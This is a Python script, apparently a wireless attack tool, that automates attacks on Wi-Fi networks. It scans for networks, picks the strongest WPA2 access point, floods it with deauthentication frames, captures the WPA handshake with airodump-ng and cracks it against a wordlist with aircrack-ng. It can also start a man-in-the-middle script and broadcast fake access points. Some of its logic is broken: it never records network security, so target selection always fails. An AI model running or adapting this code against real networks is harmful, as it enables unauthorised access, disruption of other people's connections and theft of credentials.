import os
import time
import threading
import audit
from scapy.all import *

# Monitor mode interface
interface = "wlan1"

# Global variables for selected network and client
selected_ap_mac = None
selected_ap_essid = None

# Handshake capture path (saved locally)
handshake_capture_file = "handshake.pcap"
wordlist_path = "wordlist.txt"  # Path to wordlist for cracking

# Dictionary to store discovered networks
networks = {}
sniffing_thread = None
stop_sniffing = threading.Event()

# Function to scan networks
def scan_networks(timeout=10):
    print("[*] Scanning for available networks...")

    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            essid = pkt[Dot11Elt].info.decode() if pkt[Dot11Elt].info else "Hidden SSID"
            bssid = pkt[Dot11].addr2
            signal_strength = -(256 - ord(pkt.notdecoded[-4:-3])) if pkt.notdecoded else "Unknown"
            if bssid not in networks:

                networks[bssid] = {'essid': essid, 'signal': signal_strength}
                print(f"[*] Found network: {essid} - {bssid} (Signal: {signal_strength} dBm)")

    # Run sniffing in a thread to avoid blocking the main code
    global sniffing_thread
    stop_sniffing.clear()
    sniffing_thread = threading.Thread(target=sniff, kwargs={
        'iface': interface,
        'prn': packet_handler,
        'timeout': timeout
    })
    sniffing_thread.start()
    sniffing_thread.join()  # Wait for sniffing to complete
    print("[*] Scanning complete.")


# Function to automatically select the strongest WPA2 network
def select_network():
    if not networks:
        print("[-] No networks found. Run a scan first (Option 1).")
        return False

    # Filter networks with WPA2 and sort by signal strength (higher is better)
    wpa2_networks = [(bssid, info) for bssid, info in networks.items() if 'WPA2' in info.get('security', '')]
    wpa2_networks.sort(key=lambda x: x[1]['signal'], reverse=True)

    if not wpa2_networks:
        print("[-] No WPA2 networks found.")
        return False

    # Select the network with the strongest signal
    selected_bssid, selected_info = wpa2_networks[0]

    global selected_ap_mac, selected_ap_essid
    selected_ap_mac = selected_bssid
    selected_ap_essid = selected_info['essid']

    print(f"[*] Automatically selected the strongest WPA2 network: {selected_ap_essid} ({selected_ap_mac}) - Signal: {selected_info['signal']} dBm")
    return True
# Function to send deauthentication frames
def send_deauth_frames(ap_mac=selected_ap_mac, client_mac="FF:FF:FF:FF:FF:FF", count=100):
    print(f"[*] Sending deauth frames to {ap_mac} targeting {client_mac}...")
    dot11 = Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)

    for _ in range(count):
        sendp(packet, iface=interface, inter=0.1, verbose=False)
    print(f"[*] Sent {count} deauth frames.")

# Function to capture WPA handshake using airodump-ng
def capture_handshake():
    if not selected_ap_mac:
        print("[-] No network selected. Please select one first.")
        return

    print("[*] Listening for WPA handshake...")
    os.system(f"airodump-ng -w handshake --bssid {selected_ap_mac} --channel 6 {interface} &")
    time.sleep(20)  # Capture for 10 seconds
    os.system("pkill airodump-ng")
    print(f"[*] Handshake saved as handshake-01.pcap.")

# Function to check for a valid handshake
def check_handshake():
    print("[*] Checking for handshake...")
    result = os.system(f"aircrack-ng handshake-01.cap")
    if result == 0:
        print("[+] Handshake captured successfully!")
        return True
    else:
        print("[-] No handshake detected.")
        return False

# Function to crack handshake using aircrack-ng
def crack_handshake():
    print("[*] Cracking handshake using aircrack-ng...")
    os.system(f"aircrack-ng handshake-01.cap -w {wordlist_path}")
    print("[*] Cracking attempt finished.")

# Function to perform MITM attack
def mitm_attack():
    ip_range = input("Enter the IP range for MITM attack (e.g., 10.0.0.0/24): ")
    command = f"sudo python3 mitm.py -ip_range {ip_range}"
    print(f"[*] Running MITM attack on {ip_range}...")
    os.system(command)

# Function to create fake APs
def create_fake_ap(essid, channel):
    beacon = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55")
    beacon /= Dot11Beacon(cap="ESS+privacy")
    beacon /= Dot11Elt(ID="SSID", info=essid)
    beacon /= Dot11Elt(ID="DSset", info=chr(channel).encode())

    sendp(RadioTap()/beacon, iface=interface, inter=0.1, verbose=False)

def create_fake_aps():
    num_aps = int(input("Enter the number of fake APs to create: "))
    for i in range(num_aps):
        essid = input(f"Enter SSID for fake AP {i+1}: ")
        channel = int(input(f"Enter channel (1-13) for fake AP {i+1}: "))
        print(f"[*] Creating fake AP: {essid} on channel {channel}")
        create_fake_ap(essid, channel)
    print("[*] Fake APs created.")


# Main menu
def run():
    scan_networks()
    select_network()
    send_deauth_frames()
    capture_handshake()
    check_handshake()
    crack_handshake()
    
    

if __name__ == "__main__":
    run()
